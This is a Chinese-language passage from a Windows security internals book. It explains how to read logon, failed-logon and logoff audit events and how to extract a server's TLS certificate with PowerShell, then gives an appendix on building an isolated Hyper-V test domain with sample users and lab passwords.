让我们看看这些事件提供的信息。代码清单 15-23首先查询安全事件日志中的成功登录事件（事件ID 4624）。请以管理员身份运行此命令。




```
PS> Get-WinEvent -FilterHashtable @{logname='Security';id=@(4624)} |
Select-Object -ExpandProperty Message
An account was successfully logged on.

Subject:
        Security ID:            S-1-5-18
        Account Name:           GRAPHITE$
        Account Domain:         MINERAL
        Logon ID:               0x3E7

Logon Information:
        Logon Type:             2
        Restricted Admin Mode:  No
        Virtual Account:        No
        Elevated Token:         Yes

Impersonation Level:            Impersonation

New Logon:
        Security ID:            S-1-5-21-1195776225-522706947-2538775957-1110
        Account Name:           alice
        Account Domain:         MINERAL
        Logon ID:               0x15CB183
        Linked Logon ID:        0x15CB1B6
        Network Account Name:   -
        Network Account Domain: -
        Logon GUID:             {d406e311-85e0-3932-dff5-99bf5d834535}

Process Information:
        Process ID:             0x630
        Process Name:           C:\Windows\System32\winlogon.exe

Network Information:
        Workstation Name:       GRAPHITE
        Source Network Address: 127.0.0.1
        Source Port:            0

Detailed Authentication Information:
        Logon Process:            User32
        Authentication Package:   Negotiate
        Transited Services:       -
        Package Name (NTLM only): -
        Key Length:               0
```


*代码清单 15-23：成功交互式认证事件的日志记录*

此清单显示了一个成功认证事件的示例条目。在频繁使用的系统上，可能会有许多此类条目，因此只需选择一个进行检查。

事件记录包含大量信息，其中某些信息可能不适用于所有登录类型。每个条目首先显示发出认证请求的用户账户信息。对于交互式认证，您可能会发现这是一个特权账户，例如*SYSTEM*计算机账户。接下来是登录信息，包括登录类型。数字2表示交互式登录。其他登录类型包括网络（3）、批处理（4）、服务（5）和远程交互（10）。此部分还指示认证是否使用了受限管理员模式，以及事件所代表的会话是否已提升权限。随后是令牌的模拟级别指示。

下一部分包含成功认证所创建的登录会话详细信息，包括用户的SID、名称和域。由于这是提升权限的交互式认证，我们会看到两个登录ID：一个用于会话本身，另一个用于为UAC创建的关联非提升登录会话。

接下来是发出认证请求的进程详细信息。在此示例中，它是调用LsaLogonUser的进程。最后两个部分包含网络认证信息和其他未归类的附加详细信息。详细认证信息的一部分是用于认证的安全包。在这种情况下，使用了Negotiate，因此它会为用户选择最佳的认证协议。

无论认证是通过LsaLogonUser还是通过网络认证发生，您都会看到相同类型的事件记录。例如，如果事件是NTLM网络认证，您应该在详细认证信息部分看到类似代码清单 15-24的内容。




```
Detailed Authentication Information:
  Logon Process:             NtLmSsp
  Authentication Package:    NTLM
  Transited Services:        -
  Package Name (NTLM only):  NTLM V2
  Key Length:                128
```


*代码清单 15-24：成功NTLM网络认证的详细信息*

现在让我们来看一个失败的认证事件。代码清单 15-25以管理员身份查询事件ID为4625的事件。




```
PS> Get-WinEvent -FilterHashtable @{logname='Security';id=@(4625)} |
Select-Object -ExpandProperty Message
An account failed to log on.
--snip--
Account For Which Logon Failed:
    Security ID:        S-1-0-0
    Account Name:       alice
    Account Domain:     MINERAL

Failure Information:
    Failure Reason:     Unknown user name or bad password.
    Status:             0xC000006D
    Sub Status:         0xC000006A
--snip--
```


*代码清单 15-25：失败认证事件日志记录*

在输出中，我只突出显示了一条记录。它包含与成功认证相同的许多部分，因此我删除了两种记录类型中共同出现的内容。

此处显示的第一部分包含认证失败的用户账户详细信息。SID条目不保证有效；例如，在此情况下，SID并不代表*alice*用户。接下来，我们获得更多关于失败的详细信息，从错误的文本版本开始，然后是状态，这里是一个NT状态代码STATUS_LOGON_FAILURE。子状态代码提供了更多细节；在此情况下，它是STATUS_WRONG_PASSWORD，表示用户未提供有效密码。您可能遇到的其他子状态代码包括STATUS_NO_SUCH_USER（如果用户不存在）和STATUS_ACCOUNT_DISABLED（如果用户账户已被禁用）。

最后，我们将查看一个注销事件，该事件在登录会话被删除时生成。这通常发生在没有引用该登录会话的令牌对象剩余时。以管理员身份运行代码清单 15-26中的命令。




```
PS> Get-WinEvent -FilterHashtable @{logname='Security';id=@(4634)} |
Select-Object -ExpandProperty Message
An account was logged off.

Subject:
    Security ID:    S-1-5-21-1195776225-522706947-2538775957-1110
    Account Name:   alice
    Account Domain: MINERAL
    Logon ID:       0x15CB183

Logon Type:        2
```


*代码清单 15-26：注销认证事件日志记录*

此事件日志记录比成功或失败认证的记录简单得多。它仅包含主体信息，包括用户名和域。要将成功的认证事件与相应的注销事件匹配，您可以比较登录ID。

### 工作示例

最后，让我们通过一些使用本章所学命令的工作示例来结束。

#### 识别身份验证失败的原因

我在前一节中提到，当身份验证过程失败时，事件日志中会显示两个状态代码：主状态，通常是STATUS_LOGON_FAILURE，以及子状态，如STATUS_WRONG_PASSWORD。不幸的是，事件日志只自动将主状态代码转换为字符串，然后通常生成一条通用的“用户名或密码不正确”的消息，这对诊断身份验证失败帮助不大。让我们编写一个快速脚本来分析事件日志记录，并自动将子状态代码转换为消息。

我们必须解决的第一个直接问题是如何从事件日志记录中获取子状态代码。你可以尝试手动从文本消息中解析它。然而，不同语言的消息会有所不同，你可能无法依赖诸如SubStatus这样的文本字符串的存在。不过，事件日志记录确实将其所有重要信息作为单独的属性存储，你可以通过事件日志记录对象上的Properties属性查询这些属性。代码清单 15-27显示了此类查询生成的输出。




```
PS> $record = Get-WinEvent -FilterHashtable @{logname='Security';id=@(4634)} | Select -First 1
PS> $record.Properties
Value
-----
S-1-5-21-1195776225-522706947-2538775957-1110
alice
MINERAL
--snip--
```


*代码清单 15-27：显示事件日志记录属性*

不幸的是，属性列表只包含值，没有属性名称的指示。我们想要名为SubStatus的属性，它可能总是在属性列表中的相同索引位置，但无法保证总是如此。因此，要获取此信息，我们必须手动检查存储事件日志属性的XML。我们可以通过记录上的ToXml方法请求此信息。代码清单 15-28展示了如何从事件日志记录中提取命名属性。




```
PS> function Get-EventLogProperty {
    [CmdletBinding()]
    param(
        [parameter(Mandatory, Position = 0, ValueFromPipeLine)]
        [System.Diagnostics.Eventing.Reader.EventRecord]$Record
    )

    PROCESS {
      ❶ $xml = [xml]$Record.ToXml()
        $ht = @{
            TimeCreated = $Record.TimeCreated
            Id = $Record.Id
        }
      ❷ foreach($ent in $xml.Event.EventData.data) {
            $ht.Add($ent.Name, $ent."#text")
        }
        [PSCustomObject]$ht
    }
}
PS> Get-EventLogProperty $record
SubjectUserName           : alice
TimeCreated               : 2/24 1:15:06 PM
IpPort                    : -
SubjectLogonId            : 0x54541
KeyLength                 : 0
LogonProcessName          : Advapi
IpAddress                 : -
LmPackageName             : -
TransmittedServices       : -
WorkstationName           : GRAPHITE
SubjectUserSid            : S-1-5-21-1195776225-522706947-2538775957-1110
❸ SubStatus                 : 0xc000006a
AuthenticationPackageName : Negotiate
SubjectDomainName         : MINERAL
ProcessName               : C:\Program Files\PowerShell\7\pwsh.exe
❹ FailureReason             : %%2313
LogonType                 : 3
Id                        : 4625
Status                    : 0xc000006d
TargetUserSid             : S-1-0-0
TargetDomainName          : mineral.local
ProcessId                 : 0xe48
TargetUserName            : alice
```


*代码清单 15-28：提取命名的事件日志记录属性*

我们首先定义Get-EventLogProperty函数，该函数将每条记录转换为一个新对象。我们需要提取事件日志记录的XML，然后将其解析为XML文档❶。EventData XML元素存储属性，因此我们使用PowerShell提供的对象模型提取每个元素，并从属性名称和正文文本构建哈希表❷。然后，我们将哈希表转换为自定义PowerShell对象，以便更容易查询。

在检查新对象的属性时，我们发现SubStatus属性现在很容易访问❸。我们的方法存在一些限制；例如，我们尚未将失败原因从资源标识符转换为字符串❹。然而，我们不需要失败原因，因为如果需要，我们可以从状态代码中获取消息。

现在让我们扩展代码以提取身份验证失败的子状态（代码清单 15-29）。




```
❶ PS> function Get-AuthFailureStatus {
    [CmdletBinding()]
    param(
        [parameter(Mandatory, Position = 0, ValueFromPipeLine)]
        $Record
    )

    PROCESS {
        [PSCustomObject]@{
            TimeCreated = $Record.TimeCreated
            UserName = $Record.TargetUserName
            DomainName = $Record.TargetDomainName
          ❷ SubStatus = (Get-NtStatus -Status $Record.SubStatus).StatusName
        }
    }
}

❸ PS> Get-NtToken -Logon -User $env:USERNAME -Domain $env:USERDOMAIN
-Password "InvalidPassword"
PS> Get-NtToken -Logon -User "NotARealUser" -Domain $env:USERDOMAIN -Password "pwd"
❹ PS> Get-WinEvent -FilterHashtable @{logname='Security';id=@(4625)} |
Select-Object -First 2 | Get-EventLogProperty | Get-AuthFailureStatus
TimeCreated           UserName      DomainName  SubStatus
-----------           --------      ----------  ---------
2/24      1:15:06 PM  alice         MINERAL     STATUS_WRONG_PASSWORD
2/24/     1:14:45 PM  NotARealUser  MINERAL     STATUS_NO_SUCH_USER
```


*代码清单 15-29：解析身份验证失败属性并转换其子状态代码*

我们首先定义一个函数，将记录属性转换为更简单的身份验证失败对象❶。我们只提取时间戳、用户名和域名，然后将SubStatus属性转换为其NT状态名称❷。

然后，我们执行两次失败的身份验证以在事件日志中生成一些条目❸。我们过滤日志以仅返回身份验证失败记录，然后在管道中转换记录❹。在生成的输出中，我们可以看到两个条目。第一个的子状态为STATUS_WRONG_PASSWORD，表明用户有效但密码错误。第二个的子状态为STATUS_NO_SUCH_USER，表明用户不存在。

#### 使用安全通道提取服务器的TLS证书

接下来，让我们通过一个简单示例来了解如何使用安全通道身份验证协议。我们将与一个安全的Web服务器建立TCP连接并提取其服务器证书，然后使用它来检索可能拥有该服务器的组织的详细信息以及证书是否有效。

请注意，获取服务器证书的方法可能比此示例中采用的方法更好。例如，大多数Web浏览器允许你通过浏览到服务器来显示和导出证书。然而，这不会帮助你了解安全通道的工作原理。首先，将代码清单 15-30的内容复制到脚本文件*get_server_cert.ps1*中。




```
❶ param(
    [Parameter(Mandatory, Position = 0)]
    [string]$Hostname,
    [int]$Port = 443
)

$ErrorActionPreference = "Stop"

❷ function Get-SocketClient {
    param(
        [Parameter(Mandatory)]
        $Socket
    )

    $Socket.ReceiveTimeout = 1000
    $Socket.Client.NoDelay = $true
    $stream = $Socket.GetStream()
    return @{
        Reader = [System.IO.BinaryReader]::new($stream)
        Writer = [System.IO.BinaryWriter]::new($stream)
    }
}

❸ function Read-TlsRecordToken {
    param(
        [Parameter(Mandatory)]
        $Client
    )
    $reader = $Client.Reader
    $header = $reader.ReadBytes(5)
    $length = ([int]$header[3] -shl 8) -bor ($header[4])
    $data = @()
  ❹ while($length -gt 0) {
        $next = $reader.ReadBytes($length)
        if ($next.Length -eq 0) {
            throw "End of stream."
        }
        $data += $next
        $length -= $next.Length
    }

    Get-LsaAuthToken -Token ($header+$data)
}

❺ Use-NtObject($socket = [System.Net.Sockets.TcpClient]::new($Hostname, 443)) {
    $tcp_client = Get-SocketClient $socket

  ❻ $credout = New-LsaCredentialHandle -Package "Schannel" -UseFlag Outbound
    $client = New-LsaClientContext -CredHandle $credout -Target $Hostname
-RequestAttribute ManualCredValidation

  ❼ while(!(Test-LsaContext -Context $client)) {
      ❽ if ($client.Token.Length -gt 0) {
            $tcp_client.Writer.Write($client.Token.ToArray())
        }

      ❾ $record = Read-TlsRecordToken -Client $tcp_client
        Update-LsaClientContext -Client $client -Token $record
    }

  ❿ $client.RemoteCertificate
}
```

*代码清单 15-30：用于读取 TLS 服务器证书的脚本*

我们首先定义几个参数，用于指定服务器的主机名和可选的 TCP 端口❶。HTTPS 使用众所周知的端口 443；然而，TLS 并不仅限于该端口，因此如果您想针对不同的服务，可以更改此端口。

接着，我们定义了几个函数。第一个函数 `Get-SocketClient` 将 TCP 客户端对象转换为 `BinaryReader` 和 `BinaryWriter`❷。TLS 协议具有相对简单的二进制记录结构，因此使用这些类可以更轻松地解析网络流量。

第二个函数 `Read-TlsRecordToken` 从服务器读取单个 TLS 记录，并将其作为身份验证令牌返回❸。我们首先从记录中读取 5 字节的头部，提取数据的长度，然后从流中读取数据。由于 TCP 是流式协议，无法保证所有所需数据在一次读取中全部返回，因此您必须循环执行读取，直到接收到所需的所有数据❹。

现在进入脚本的主体部分。我们首先通过脚本参数提供的主机名和 TCP 端口建立 TCP 连接❺。然后，将套接字转换为读取器和写入器对象。接下来，我们创建 Schannel 凭据和客户端上下文❻，将客户端上下文的目标设置为主机名，并启用手动凭据验证，因为在此示例中我们并不关心服务器证书是否有效。

现在，我们可以循环，直到客户端上下文完成身份验证❼。如果有令牌要发送到服务器，我们将其转换为字节并写入 TCP 套接字❽。正如我们之前所见，TLS 客户端和服务器可以生成多个 TLS 记录，上下文必须在生成新令牌之前处理这些记录。

一旦我们发送了客户端身份验证令牌，就可以从服务器读取下一个 TLS 记录并更新客户端❾。此循环将持续进行，直到身份验证成功完成或异常停止脚本。最后，我们可以从脚本返回服务器的证书❿。

代码清单 15-31 展示了如何使用我们编写的脚本。




```
PS> $cert = .\get_server_cert.ps1 -Hostname www.microsoft.com
PS> $cert
Thumbprint                                Subject
----------                                -------
9B2B8AE65169AA477C5783D6480F296EF48CF14D  CN=www.microsoft.com,...

PS> $cert | Export-Certificate -FilePath output.cer
    Directory: C:\demo
Mode               LastWriteTime           Length Name
----               -------------           ------ ----
-a----             02-21   17:10           2173   output.cer
```


*代码清单 15-31：获取* www.microsoft.com *的服务器证书并将其导出到文件*

您通过提供服务器的主机名来调用脚本。可选地，您可以指定 TCP 端口，但在本例中，我们使用端口 443，即众所周知的 HTTPS，这也是脚本的默认端口。返回的证书是一个对象，您可以使用 PowerShell 进行检查。您还可以使用 `Export-Certificate` 命令将证书导出到文件。

### 总结

本章首先介绍了安全缓冲区及其在网络安全认证、加密和签名过程中与SSPI API交换信息的用途。随后概述了协商认证协议，该协议允许双方在事先不确定使用何种认证协议的情况下进行网络认证。

接下来，我们探讨了一些较少使用的安全包，如安全通道和CredSSP。这些安全包有特定的应用场景，但相比NTLM或Kerberos，其使用更为复杂。我们还讨论了NTLM和Kerberos中的匿名与身份网络认证，并涵盖了低盒令牌沙箱内的网络认证（我描述了多次绕过此认证的方法）。

本章最后概述了用户认证时生成的安全审计事件。您了解了用于描述用户认证成功或失败的不同事件类型，并学会了如何利用这些事件来确定哪些用户尝试过对工作站进行认证。

### 结语

在结束这最后一章之际，我希望您能将所学到的Windows安全内部机制知识应用到自己的实践中。我已详细涵盖了许多领域，从安全参考监视器(Security Reference Monitor, SRM)和令牌到访问检查和认证，并提供了示例来演示重要主题。

然而，我未能提供脚本来演示我们讨论过的所有功能组合。因此，建议您查阅NtObjectManager模块中各种命令的帮助功能，并尝试使用它们。如果您在Windows虚拟机上进行测试，几乎不会造成什么损害。（实际上，如果在实验过程中系统出现蓝屏死机，深入探究原因可能是个好主意，因为您可能发现了安全漏洞。）

本章之后附有一些参考资料：附录A 包含设置域网络进行测试的指南，附录B 包含SDDL别名列表。

## A. 构建用于测试的Windows域网络

本书多个章节提及了一个可用于测试目的的Windows域网络。虽然您无需搭建这样的网络即可跟随章节内容，但您可以使用它来运行示例，然后修改提供的命令以观察不同的结果。如果您手头没有合适的Windows域网络用于测试，本附录将指导您通过虚拟机搭建一个。

在虚拟机中运行Windows具有诸多优势。首先，它让您能够完全灵活地配置（或错误配置）Windows，而不会危及日常安装的安全性。虚拟化平台通常允许您对虚拟机进行快照，以便在出现问题时回滚到已知的良好状态。您还可以隔离网络流量，防止其影响同一网络上的其他系统。最后，您可以使用虚拟机在非Windows环境中运行Windows。

域配置步骤尽可能使用PowerShell。请注意，除非另有说明，您必须以管理员用户身份运行所有这些PowerShell命令。

### 域网络

图 A-1 是我们将要构建的网络示意图。有关域网络结构的更多信息，请参阅第10章。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/FigureA-1.webp)

图 A-1：域网络配置

该网络包含一个由三个域组成的林。林的根 DNS 名称为 *mineral.local*，其两个子域分别为 *engineering.mineral.local* 和 *sales.mineral.local*。要创建一个用于测试的最小功能域，您只需 *PRIMARYDC*（根域控制器）和 *GRAPHITE*（加入域的工作站）。虚线内的任何内容均为可选。接下来的章节将向您展示如何设置域网络，并为每个要包含的 Windows 系统配置虚拟机。

### 安装与配置 Windows Hyper-V

我们将使用 Hyper-V 来搭建 Windows 域网络，这是随 64 位版本的 Windows 专业版、企业版和教育版免费提供的虚拟化软件。如果您未运行 Windows 或不想使用 Hyper-V，另一个不错的免费选择是 Oracle 的 VirtualBox（*[https://www.virtualbox.org](https://www.virtualbox.org/)*）。

要安装 Hyper-V 及其工具，请以管理员身份启动 PowerShell 控制台并运行以下命令。安装后请务必重启系统：


```
PS> Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All
```


下一步是为虚拟机配置一个新网络，如 Listing A-1 所示。这将使您能够完全控制域网络配置的各个方面，并将其与您的真实网络隔离。




```
PS> New-VMSwitch -Name "Domain Network" -SwitchType Internal
PS> $index = (Get-NetAdapter |
Where-Object Name -Match "Domain Network").ifIndex
PS> New-NetIPAddress -IPAddress 192.168.99.1 -PrefixLength 24
-InterfaceIndex $index
PS> New-NetNat -Name DomNAT -InternalIPInterfaceAddressPrefix 192.168.99.0/24
```


*Listing A-1: 创建新的虚拟机网络交换机*

我们首先使用 `New-VMSwitch` 命令为域网络创建一个新交换机，此操作仅需在初始配置过程中执行一次。我们将交换机命名为“Domain Network”，并将其类型设置为 `Internal`，这意味着它是一个可以与虚拟机主机通信的虚拟网络。

接下来，我们需要为交换机创建的虚拟网络适配器分配一个 IP 地址。`Get-NetAdapter` 命令会列出所有网络适配器，并找到我们域网络适配器的唯一索引号。然后，我们将 IP 地址 192.168.99.1 分配给该适配器，子网前缀长度为 24 位（更常见的表示形式为子网掩码 255.255.255.0）。您可以根据需要设置任意 IP 地址，但请注意，如果更改地址，您还需要在本附录的其余部分中同步更新。

最后一步是使用 `New-NetNat` 命令为 IP 地址设置*网络地址转换（NAT）*。这将允许网络上的计算机通过将其默认网关设置为适配器的 IP 地址（本例中为 192.168.99.1）来访问互联网。

> 注意
>
> *此配置未设置动态主机配置协议（DHCP）服务器来自动为网络上的计算机分配 IP 地址。由于网络规模较小，我们将随着配置过程手动为计算机静态分配 IP 地址。*

### 创建虚拟机

表 A-1 列出了我们将要设置的虚拟机，以及各自的操作系统类型和 IP 地址。我将逐步介绍 *PRIMARYDC*、*GRAPHITE* 以及可选的 *SALESDC* 虚拟机的设置过程。表中其他虚拟机完全可选；如果你想创建它们，可以在设置各虚拟机的章节中，将指定值替换为表中的相应值。

| 虚拟机名称             | 操作系统                           | IP 地址        |
| :--------------------- | :--------------------------------- | :------------- |
| PRIMARYDC              | Windows Server                     | 192.168.99.10  |
| GRAPHITE               | Windows 专业版或企业版             | 192.168.99.50  |
| CINNABAR               | Windows Server                     | 192.168.99.20  |
| SALESDC                | Windows Server                     | 192.168.99.110 |
| GOLD                   | Windows 专业版或企业版             | 192.168.99.150 |
| ENGDC                  | Windows Server                     | 192.168.99.210 |
| STEEL                  | Windows 专业版或企业版             | 192.168.99.220 |

微软提供了 Windows 企业版和 Windows Server 的试用版虚拟机。我建议使用你常用的搜索引擎在微软网站上查找最新链接。对于每台机器，请安装正确的 Windows 版本，然后使用 PowerShell 进行配置。

要使用 Hyper-V 运行 Windows 虚拟机，你需要 Windows 专业版或企业版以及 Windows Server 的安装介质和许可证密钥。获取这些内容的一种常见方式是通过 Microsoft Visual Studio 订阅。我们讨论的主题不会受你使用的 Windows 和 Server 版本影响。

> 注意
>
> *服务器安装包括一个带有 Windows 桌面的长期服务分支，以及一个更新的版本，称为*服务器核心版本*，它只有命令行。由于我们将使用 PowerShell 配置服务器安装，因此任一版本均可。不过，如果你更习惯使用 GUI，请使用带桌面的长期服务分支。*

清单 A-2 定义了我们将用于完成大部分虚拟机设置工作的函数 New-TestVM。




```
PS> function New-TestVM {
    param(
        [Parameter(Mandatory)]
        [string]$VmName,
        [Parameter(Mandatory)]
        [string]$InstallerImage,
        [Parameter(Mandatory)]
        [string]$VmDirectory
    )
  ❶ New-VM -Name $VmName -MemoryStartupBytes 2GB -Generation 2
-NewVHDPath "$VmDirectory\$VmName\$VmName.vhdx" -NewVHDSizeBytes 80GB
-Path "$VmDirectory" -SwitchName "Domain Network"
  ❷ Set-VM -Name $VmName -ProcessorCount 2 -DynamicMemory
  ❸ Add-VMScsiController -VMName $VmName
    Add-VMDvdDrive -VMName $VmName -ControllerNumber 1 -ControllerLocation 0
-Path $InstallerImage
    $dvd = Get-VMDvdDrive -VMName $VmName
    Set-VMFirmware -VMName $VmName -FirstBootDevice $dvd
}
```


*清单 A-2：定义 New-TestVM 函数*

New-TestVM 函数接收虚拟机名称，以便创建 DVD 映像的安装路径和虚拟机资产的基目录。我们首先调用 New-VM 命令来创建虚拟机 ❶。我们将其内存设置为 4GB，并创建一个 80GB 的虚拟硬盘。（如果你愿意，可以增加这些大小。）我们还将默认网络适配器分配给我们之前在清单 A-1中创建的“域网络”交换机。

接下来，我们使用 Set-VM 命令配置一些 New-VM 未公开的虚拟机选项 ❷。我们为虚拟机分配两个 CPU，因为我发现现代版本的 Windows 在只有一个 CPU 的情况下运行会比较吃力。如果你的宿主机有多个 CPU 核心，可以增加 CPU 数量。

我们还启用了动态内存。这允许 Windows 根据需要调整虚拟机的内存使用量。我发现通常服务器安装运行时仅使用约 2GB 内存，但可能会更多，尤其是客户端。动态内存可以根据需要增加或减少分配的内存。

最后，我们在虚拟 SCSI 控制器上设置一个 DVD 驱动器，并将 DVD 映像分配给它 ❸。我们将把它作为主启动驱动器，以便从 DVD 映像安装操作系统。

现在，我们需要使用我们定义的函数创建每台虚拟机，并开始安装过程。

### PRIMARYDC 服务器

*PRIMARYDC* 机器是一台 Windows 服务器，将作为我们林中的根域控制器。在 Listing A-3 中，我们首先以管理员身份创建虚拟机。




```
PS> New-TestVM -VmName "PRIMARYDC" -InstallerImage "C:\iso\server.iso"
-VmDirectory "C:\vms"
PS> vmconnect localhost PRIMARYDC
PS> Start-VM -VmName "PRIMARYDC"
```


*Listing A-3: 创建并启动* PRIMARYDC *虚拟机*

我们从 DVD 镜像文件 *C:\iso\server.iso* 安装 *PRIMARYDC* 虚拟机，并在 *C:\vms* 目录下创建虚拟机。这将在虚拟机目录下为 *PRIMARYDC* 服务器的文件创建一个新子目录，从而让我们能够为每台虚拟机分离资源。接下来，我们启动虚拟机的用户界面，以便与安装过程交互，然后启动虚拟机。

现在您可以与虚拟机交互了，可以按照任何其他 Windows Server 安装的步骤进行安装。我不会为此提供详细说明，因为这主要是选择区域、安装驱动器并遵循默认流程的问题。

在安装过程中被要求设置 *Administrator* 用户密码时，您可以设置任何您喜欢的密码，但在本书中，我假设将其设置为 Passw0rd。由于这是一个弱密码，请不要将这些虚拟机暴露在不受信任用户可访问的网络中。然而，对于测试和演示目的，使用易于记忆的密码通常是个好主意。

一旦您获得了桌面（如果使用长期服务分支版本的服务器）或命令行（如果使用服务器核心版本）的访问权限，就可以完成基本设置。所有后续的 PowerShell 命令都将在虚拟机本身上运行，而不是在主机上。首先启动一个管理员权限的 PowerShell 来运行 Listing A-4 中的命令。




```
PS> $index = (Get-NetAdapter).ifIndex
PS> New-NetIPAddress -InterfaceIndex $index -IPAddress 192.168.99.10
-PrefixLength 24 -DefaultGateway 192.168.99.1
PS> Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses 8.8.8.8
```


*Listing A-4: 设置* PRIMARYDC *虚拟机网络*

由于我们之前创建的网络交换机不支持 DHCP，它不会在安装期间自动分配 IP 地址。因此，我们需要使用静态 IP 地址来设置网络。Listing A-4 首先设置网络适配器的 IP 地址；您应该使用 Table A-1 中为您正在配置的虚拟机指定的 IP 地址。DefaultGateway 参数应设置为在 Listing A-1 中在主机上设置的 IP 地址，以便流量能够路由到外部网络。

您还需要为网络适配器指定 DNS 服务器地址。在 Listing A-4 中，我们将其设置为公共 Google DNS 服务器的地址 8.8.8.8。如果您知道您的互联网服务提供商或其他首选 DNS 服务器的 IP 地址，请改用该地址。一旦我们完成域控制器的设置，我们将不再需要此 DNS 服务器，因为域控制器有自己的 DNS 服务器。

现在您应该能够访问外部网络了。此时，如果您不是使用试用版，可能需要激活您的 Windows Server 副本。您还需要确保 Windows 副本是最新的，包括所有安全补丁。虽然网络会在一定程度上将虚拟机与外部网络隔离，但这并不意味着它们不会被攻破，所以最好确保安全。

接下来，使用 Rename-Computer 命令重命名计算机，如 Listing A-5 所示。




```
PS> Rename-Computer -NewName "PRIMARYDC" -Restart
```


*Listing A-5: 重命名计算机*

此名称将在域网络中使用，因此使用易于记忆的名称会有所帮助。如果您愿意，可以将 *PRIMARYDC* 替换为您自己的名称。

重命名计算机后，您需要将服务器配置为 *mineral.local* 域的域控制器。以管理员身份登录服务器，并运行 Listing A-6 中的命令。




```
PS> Install-WindowsFeature AD-Domain-Services
PS> Install-ADDSForest -DomainName mineral.local -DomainNetbiosName MINERAL
-InstallDns -Force
SafeModeAdministratorPassword: ********
Confirm SafeModeAdministratorPassword: ********
```


*Listing A-6: 安装并配置 Active Directory 域服务*

首先，我们安装 AD-Domain-Services 功能。此功能会安装 Active Directory 服务器及相关服务，使服务器能够作为域控制器运行。接下来，我们运行 `Install-ADDSForest` 命令来设置林并创建根域。我们指定域的 DNS 名称，此处为 *mineral.local*。同时，我们指定域的简单名称为 *MINERAL*，并请求安装本地 DNS 服务器。Active Directory 在没有 DNS 服务器的情况下无法工作，而由于这是一个隔离网络，因此在域控制器服务器上运行 DNS 服务器是合理的。

在设置林时，系统会要求您指定一个安全模式管理员密码。此密码允许您恢复 Active Directory 数据库。在如此小规模的非生产域中，您不太可能需要此功能，但仍应指定一个您能记住的密码。安装过程中可能会出现一些警告；您可以安全地忽略这些警告。命令完成后，服务器将自动重启。

重启完成后，您应重新对服务器进行身份验证，但请确保使用用户名 *MINERAL\Administrator*，以便使用域管理员账户。域管理员的密码应与您最初安装服务器时配置的密码相同。然后，启动 PowerShell 实例并运行 Listing A-7 中的命令，以进行一些基本用户设置。




```
❶ PS> Set-ADDefaultDomainPasswordPolicy -Identity mineral.local 
-MaxPasswordAge 0
❷ PS> $pwd = ConvertTo-SecureString -String "Passw0rd1" -AsPlainText -Force
PS> New-ADUser -Name alice -Country USA -AccountPassword $pwd
-GivenName "Alice Bombas" -Enabled $true
PS> $pwd = ConvertTo-SecureString -String "Passw0rd2" -AsPlainText -Force
PS> New-ADUser -Name bob -Country JP -AccountPassword $pwd
-GivenName "Bob Cordite" -Enabled $true

❸ PS> New-ADGroup -Name 'Local Resource' -GroupScope DomainLocal
PS> Add-ADGroupMember -Identity 'Local Resource' -Members 'alice'
PS> New-ADGroup -Name 'Universal Group' -GroupScope Universal
PS> Add-ADGroupMember -Identity 'Universal Group' -Members 'bob'
PS> New-ADGroup -Name 'Global Group' -GroupScope Global
PS> Add-ADGroupMember -Identity 'Global Group' -Members 'alice','bob'
```


*Listing A-7: 配置域密码策略并添加用户和组*

首先，我们设置域的密码策略，以防止密码过期 ❶。没有什么比几个月后回到虚拟机时面临更改密码（而您很快就会忘记）更糟糕的了。

> 注意
>
> *尽管新域的默认密码过期时间为 42 天，但 Microsoft 不再建议启用强制密码过期。这是因为频繁要求用户更改密码可能弊大于利，会鼓励他们使用简单密码，以免忘记。*

然后，我们创建两个域用户 *alice* 和 *bob*，并为每个用户分配密码 ❷。我们还会为每个用户设置一些 Active Directory 属性：具体来说，是他们的姓名和国家。我在 Table A-2 中总结了要指定的值。当然，您可以将名称和值设置为任何您偏好的内容。

| 用户名 | 给定名称     | 国家 | 密码      |
| :----- | :----------- | :--- | :-------- |
| alice  | Alice Bombas | USA  | Passw0rd1 |
| bob    | Bob Cordite  | JP   | Passw0rd2 |

Listing A-7 中的最后一项任务是创建三个 Active Directory 组 ❸，每个组对应一种组作用域。我们还将两个用户分配到这些组的组合中。

### GRAPHITE 工作站

配置好域控制器后，我们现在可以设置一台工作站。运行 Listing A-8 中的脚本来创建虚拟机，就像我们处理 *PRIMARYDC* 时那样。




```
PS> New-TestVM -VmName "GRAPHITE" -InstallerImage "C:\iso\client.iso"
-VmDirectory "C:\vms"
PS> vmconnect localhost GRAPHITE
PS> Start-VM -VmName "GRAPHITE"
```


*Listing A-8: 创建并启动 GRAPHITE 虚拟机*

在这种情况下，您将使用 Windows 专业版或企业版的磁盘映像，而不是服务器安装版本。任何当前受支持的 Windows 10 或更高版本都足够。像平常一样继续进行安装，创建机器的用户名和密码。本书假设您使用用户名 *admin* 和密码 Passw0rd，但您可以选择任何您喜欢的用户名和密码。

Listing A-9 设置了网络，如 Listing A-4 所示。




```
PS> $index = (Get-NetAdapter).ifIndex
PS> New-NetIPAddress -InterfaceIndex $index -IPAddress 192.168.99.50
-PrefixLength 24 -DefaultGateway 192.168.99.1
PS> Set-DnsClientServerAddress -InterfaceIndex $index
-ServerAddresses 192.168.99.10
PS> Resolve-DnsName primarydc.mineral.local
Name                     Type   TTL   Section    IPAddress
----                     ----   ---   -------    ---------
primarydc.mineral.local  A      3600  Answer     192.168.99.10

PS> Rename-Computer -NewName "GRAPHITE" -Restart
```


*Listing A-9: 设置域 DNS 服务器并检查其解析*

这里唯一的区别是我们将 DNS 服务器配置为使用我们在域控制器上安装的 192.168.99.10。您可以通过尝试解析 *primarydc.mineral.local* 服务器地址来验证 DNS 服务器是否正常工作。您还应该能够解析互联网域名，因为域控制器会转发请求。

同样，一旦您配置好此网络，您需要确保在必要时激活您的 Windows 安装并下载任何更新。如果需要，您可以在继续之前将工作站重命名为您选择的名称。

在 Listing A-10 中，我们将工作站加入域。




```
PS> $creds = Get-Credential
PS> Add-Computer -DomainName MINERAL -Credential $creds
WARNING: The changes will take effect after you restart the computer GRAPHITE.

PS> Add-LocalGroupMember -Group 'Administrators' -Member 'MINERAL\alice'
PS> Restart-Computer
```


*Listing A-10: 将 GRAPHITE 工作站加入域*

首先我们需要域中用户的凭据。正如我在 第11章 中解释的，该用户不需要是域管理员；可以是普通用户。例如，当 Get-Credential 命令的 GUI 提示时，您可以输入 *alice* 用户的凭据。

